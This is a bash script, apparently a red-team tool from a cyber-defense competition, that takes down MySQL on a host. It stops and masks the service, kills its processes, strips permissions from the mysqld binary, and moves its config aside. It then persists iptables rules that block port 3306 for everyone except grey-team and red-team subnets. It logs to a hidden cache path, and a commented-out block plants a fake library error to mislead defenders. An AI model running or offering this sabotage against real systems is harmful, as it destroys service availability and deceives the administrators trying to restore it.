#!/bin/bash
# ── WHITELIST ──────────────────────────────────────────
WHITELIST=("greyteam" "scoring")
LOG="/var/lib/.cache/mysql_watch.log"
# ──────────────────────────────────────────────────────

echo "[$(date)] Running MySQL takedown..." >> $LOG

# 1. Stop and mask MySQL
systemctl stop mysql          2>/dev/null
systemctl stop mysql.service  2>/dev/null
systemctl disable mysql       2>/dev/null
systemctl mask mysql          2>/dev/null

# 2. Kill all MySQL processes
pkill -9 mysqld               2>/dev/null
pkill -9 mysqld_safe          2>/dev/null
pkill -9 mysql                2>/dev/null

# 3. Remove execute permission on binary
chmod 000 /usr/sbin/mysqld    2>/dev/null

# 4. Corrupt config
if [ -f /etc/mysql/mysql.conf.d/mysqld.cnf ]; then
    mv /etc/mysql/mysql.conf.d/mysqld.cnf \
       /etc/mysql/mysql.conf.d/mysqld.cnf.bak
fi

# # 5. Unmask temporarily to apply fake override Too difficult to remediate first day
# systemctl unmask mysql        2>/dev/null

# # 6. Plant fake error message
# mkdir -p /etc/systemd/system/mysql.service.d/
# tee /etc/systemd/system/mysql.service.d/override.conf > /dev/null << 'EOF'
# [Unit]
# Description=MySQL Database Server
# Documentation=man:mysqld(8)

# [Service]
# Type=oneshot
# ExecStart=/bin/bash -c 'echo "mysql: error while loading shared libraries: libmysql.so.5"; echo "Try: apt-get install --fix-broken"; exit 1'
# RemainAfterExit=no
# EOF

# # 7. Reload so fake message takes effect
# systemctl daemon-reload

# 8. Remask so they hit masked error first
#    then fake library error if they unmask
systemctl mask mysql          2>/dev/null

# 9. Block MySQL port but whitelist grey team and scoring
iptables -A INPUT -p tcp --dport 3306 \
    -s 10.100.0.0/24 -j ACCEPT          # allow grey team net
iptables -A INPUT -p tcp --dport 3306 \
    -s 10.100.1.0/24 -j ACCEPT          # allow red net
iptables -A INPUT -p tcp --dport 3306 -j DROP
iptables -A INPUT -p udp --dport 41641 -j ACCEPT   # tailscale
iptables -A INPUT -p udp --dport 3478  -j ACCEPT   # tailscale STUN
iptables -A INPUT -p tcp --dport 3306  -j DROP      # mysql block

# 10. Save iptables — create directory first if it doesn't exist
if [ ! -d /etc/iptables ]; then
    mkdir -p /etc/iptables
fi

iptables-save > /etc/iptables/rules.v4  2>/dev/null || \
iptables-save > /etc/iptables.rules     2>/dev/null